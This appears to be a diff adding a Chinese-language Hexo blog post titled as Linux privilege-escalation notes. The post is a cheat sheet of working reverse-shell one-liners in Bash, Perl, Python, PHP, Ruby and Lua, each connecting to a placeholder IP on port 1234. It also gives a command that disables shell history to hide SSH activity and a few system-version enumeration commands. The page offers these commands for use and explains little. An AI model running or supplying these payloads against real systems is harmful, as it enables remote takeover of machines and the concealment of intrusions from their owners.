@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="GUN Linux 提权笔记"/>
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="一个神戳戳的人">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://www.i0nAy.com/2018/01/09/GUN-Linux-提权笔记/"/>
+
+
+<meta name="description" content="GUN Linux 提权笔记Shell反弹 Bash反弹 1$ bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/1234 0&amp;gt;&amp;amp;1  Perl反弹 1$ perl -e &apos;use Socket;$i=&quot;1.2.3.4&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GUN Linux 提权笔记">
+<meta property="og:url" content="https://www.i0nAy.com/2018/01/09/GUN-Linux-提权笔记/index.html">
+<meta property="og:site_name" content="一个神戳戳的人">
+<meta property="og:description" content="GUN Linux 提权笔记Shell反弹 Bash反弹 1$ bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/1234 0&amp;gt;&amp;amp;1  Perl反弹 1$ perl -e &apos;use Socket;$i=&quot;1.2.3.4&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S">
+<meta property="og:locale" content="zh-hans">
+<meta property="og:updated_time" content="2018-01-09T10:02:49.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GUN Linux 提权笔记">
+<meta name="twitter:description" content="GUN Linux 提权笔记Shell反弹 Bash反弹 1$ bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/1234 0&amp;gt;&amp;amp;1  Perl反弹 1$ perl -e &apos;use Socket;$i=&quot;1.2.3.4&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> GUN Linux 提权笔记 - 一个神戳戳的人 </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">一个神戳戳的人</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          GUN Linux 提权笔记
+        
+      </h1>
+
+      <time class="post-time">
+          Jan 9 2018
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h1 id="GUN-Linux-提权笔记"><a href="#GUN-Linux-提权笔记" class="headerlink" title="GUN Linux 提权笔记"></a>GUN Linux 提权笔记</h1><h3 id="Shell反弹"><a href="#Shell反弹" class="headerlink" title="Shell反弹"></a>Shell反弹</h3><ul>
+<li><p><strong>Bash反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/1.2.3.4/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Perl反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">'use Socket;$i="1.2.3.4";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Python反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>PHP反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Ruby反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">'f=TCPSocket.open("1.2.3.4",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Lua反弹</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('1.2.3.4','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="登录SSH后不记录History"><a href="#登录SSH后不记录History" class="headerlink" title="登录SSH后不记录History"></a>登录SSH后不记录History</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="built_in">export</span> HISTFILE=/dev/null; <span class="built_in">export</span> HISTSIZE=0; <span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure>
+<h3 id="查看系统版本"><a href="#查看系统版本" class="headerlink" title="查看系统版本"></a>查看系统版本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">$ cat /etc/issue</span><br><span class="line">$ cat /etc/*-release</span><br><span class="line">$ cat /proc/version</span><br></pre></td></tr></table></figure>
+
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2018
+    <span class="footer-author">i0nAy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
